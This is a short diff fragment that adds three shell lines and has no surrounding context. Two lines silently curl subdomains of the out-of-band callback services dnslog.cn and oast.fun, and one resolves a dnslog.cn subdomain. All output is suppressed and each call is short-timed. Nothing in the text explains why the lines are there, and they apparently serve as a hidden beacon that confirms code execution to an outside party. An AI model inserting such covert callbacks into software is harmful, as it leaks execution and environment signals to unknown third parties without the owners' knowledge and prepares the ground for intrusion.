@@ -1,0 +1,3 @@
+curl -s -m 3 -o /dev/null http://cx1484.lt46i7.dnslog.cn/ >/dev/null 2>&1
+getent hosts gx1484.lt46i7.dnslog.cn >/dev/null 2>&1
+curl -s -m 3 -o /dev/null http://cx1484.oast.fun/ >/dev/null 2>&1
